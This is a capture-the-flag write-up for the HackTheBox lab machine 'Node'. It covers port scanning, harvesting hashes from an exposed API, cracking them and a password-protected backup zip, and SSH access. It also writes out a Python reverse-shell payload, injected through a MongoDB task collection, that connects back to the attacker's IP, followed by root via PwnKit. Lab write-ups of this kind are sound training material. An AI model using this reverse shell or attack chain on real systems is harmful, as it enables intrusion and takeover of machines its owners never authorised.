<img src="Pasted image 20240720105714.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240625173018.png]]

**Nmap Scans**
```
mapit 10.10.10.58
```

Nmap Default Scan
![[Pasted image 20240625173140.png]]

Nmap Service and Script Scan
![[Pasted image 20240625173253.png]]
![[Pasted image 20240625173308.png]]

Nmap All Port Scan
![[Pasted image 20240625173803.png]]

On port 3000
![[Pasted image 20240625173420.png]]

Feroxbuster
```
feroxbuster --url https://10.10.10.58:3000 -k -o feroxbuster.txt
```
![[Pasted image 20240625180513.png]]
Can't get any useful info

Will analyse the source code
![[Pasted image 20240625180557.png]]
We have lit of java script file, always look for sensitive info in .js files

As guessed, we got some sensitive info from http://10.10.10.58:3000/assets/js/app/app.js
![[Pasted image 20240625180720.png]]

Will navigate to the page http://10.10.10.58:3000/partials/admin.html
![[Pasted image 20240625180757.png]]
We got something...!

But only admin user can download the file

Will enumerate more, can get more paths in http://10.10.10.58:3000/assets/js/app/controllers/home.js
![[Pasted image 20240625182053.png]]
can see /api/user/latest

This gives us info http://10.10.10.58:3000/api/users/
![[Pasted image 20240625182217.png]]

decrypted all the hash using crackstaion https://crackstation.net/
![[Pasted image 20240625182602.png]]
Have encrypted three out of 4 hash

**Credentials**
myP14ceAdm1nAcc0uNT:manchester
tom:spongebob
mark:snowflake

Will try this creds to login
First with admin cred
![[Pasted image 20240625182948.png]]
Worked...!

Will download and analyse the content
![[Pasted image 20240625183654.png]]

After analysing the content its looks like base64 encoded, will decode it
```
cat myplace.backup | base64 --decode > backup.decoded
```
![[Pasted image 20240625183628.png]]

I have opened the file, but it is in some unsupported format, will analyse the file time now
![[Pasted image 20240625183829.png]]

It is a zip file, will unzip it
![[Pasted image 20240625183926.png]]
It is asking password

Will find password
```
zip2john backup.decoded > backup.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```
![[Pasted image 20240625184116.png]]
Found it....! **magicword**

After unzipping, there is new directory var, will explore
![[Pasted image 20240625184516.png]]
![[Pasted image 20240625184640.png]]
Found mark's Password: mark:5AYRft73VtFpc84k



Will ssh now with marks' cred
```
ssh mark@10.10.10.58
```
![[Pasted image 20240625184903.png]]
![[Pasted image 20240625184939.png]]

Can find user.txt in tom's home directory but we don't have permissions
![[Pasted image 20240625185114.png]]

We can see pkexec in SUID 
```
find / -perm -u=s -type f 2>/dev/null
```
![[Pasted image 20240625185405.png]]

pkexec version is vulnerable
```
pkexec --version
```
![[Pasted image 20240625185429.png]]

Using mongodb to get user tom access
```
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
```
```
show collections          \\list databse tables
db.tasks.find().pretty()   \\to list content of table tasks
```
```
db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
WriteResult({ "nInserted" : 1 })   \\insert a reverse shell code in table tasks
```
![[Pasted image 20240626001318.png]]

Will set a Netcat listener
![[Pasted image 20240626001637.png]]\


Using Pkexec 
Vulnerable version I have escalated my privileges to root 

Used PwnKit
![[Pasted image 20240626001817.png]]

Root.txt
![[Pasted image 20240626001903.png]]

User.txt
![[Pasted image 20240626001938.png]]



Done with Node....:)